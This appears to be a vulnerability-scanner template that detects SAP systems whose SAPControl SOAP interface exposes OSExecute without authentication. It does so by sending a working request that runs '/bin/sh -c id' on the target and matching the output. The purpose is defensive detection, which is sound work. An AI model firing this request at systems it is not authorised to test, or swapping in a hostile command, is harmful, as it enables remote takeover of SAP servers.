id: sap-sapcontrol-osexecute-unauth-rce

info:
  name: SAPControl - OSExecute unauthenticated RCE
  author: LRVT, l4rm4nd
  severity: critical
  description: |
    Detects SAP systems where the SAP Start Service (sapstartsrv) SAPControl
    SOAP interface exposes the OSExecute web method without authentication.

    OSExecute allows execution of arbitrary operating system commands in the
    context of the SAP instance user (for example <sid>adm on UNIX). When
    this method is callable anonymously over HTTP or HTTPS, a remote attacker
    can run arbitrary shell commands on the underlying host and fully
    compromise the SAP application server and potentially the entire system.

    This template invokes OSExecute with a harmless proof-of-concept payload
    ("/bin/sh -c id") and checks the SOAP response for typical id(1) output.
    A successful match confirms unauthenticated remote command execution
    (RCE) via sapstartsrv and should be treated as an immediate, critical
    finding. OSExecute must be configured as a protected web method and
    restricted to dedicated administration networks only.
  tags: sap,sapcontrol,soap,rce,osexecute
  reference:
    - https://sapdotbasis.wordpress.com/2019/08/08/sapcontrol-command/              # sapcontrol usage incl. management functions
    - https://itsiti.com/csmon/                                                     # overview of SAPControl web methods incl. OSExecute
    - https://help.sap.com/docs/SUPPORT_CONTENT/si/3362959700.html                  # protected vs unprotected sapstartsrv web methods
    - https://docs.avantra.com/api/latest/js/sap-control.html                       # example usage of osExecute via SAP Control API
    - https://www.slideshare.net/slideshow/sap-insecurity-scrubbing-sap-clean-with-soap/9951290  # SAP SOAP attack surface & hardening

http:
  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      Content-Type: text/xml; charset=UTF-8
      SOAPAction: '""'
      User-Agent: Mozilla/5.0

    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
        <SOAP-ENV:Header>
          <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
            <enableSession>true</enableSession>
          </sapsess:Session>
        </SOAP-ENV:Header>
        <SOAP-ENV:Body>
          <ns1:OSExecute xmlns:ns1="urn:SAPControl">
            <command>/bin/sh -c id</command>
            <async>0</async>
          </ns1:OSExecute>
        </SOAP-ENV:Body>
      </SOAP-ENV:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "OSExecuteResponse"
          - "<output>"
      - type: regex
        part: body
        regex:
          - "uid=[0-9]+\\("
      - type: word
        part: body
        negative: true
        words:
          - "AccessDenied"
          - "Invalid Credentials"
          - "not authorized"
